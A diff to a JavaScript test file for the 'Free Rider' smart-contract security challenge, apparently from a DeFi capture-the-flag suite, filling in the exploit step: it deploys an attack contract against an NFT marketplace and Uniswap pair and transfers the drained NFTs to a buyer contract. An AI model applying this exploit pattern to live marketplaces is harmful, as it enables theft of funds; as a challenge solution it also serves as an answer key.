@@ -103,8 +103,15 @@ describe('[Challenge] Free Rider', function () {
         );
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+    it('Exploit', async function () {        
+        const FreeRiderAttackContract = await ethers.getContractFactory('FreeRiderAttackContract', attacker);
+        const attackContract = await FreeRiderAttackContract.deploy(this.nft.address, this.uniswapPair.address, this.marketplace.address);
+
+        await attackContract.attack(NFT_PRICE, { gasLimit: 1e6, value: ethers.utils.parseEther('0.0451') });
+
+        for (let tokenId = 0; tokenId < AMOUNT_OF_NFTS; tokenId++) {
+            await this.nft.connect(attacker)["safeTransferFrom(address,address,uint256)"](attackContract.address, this.buyerContract.address, tokenId);
+        }
     });
 
     after(async function () {
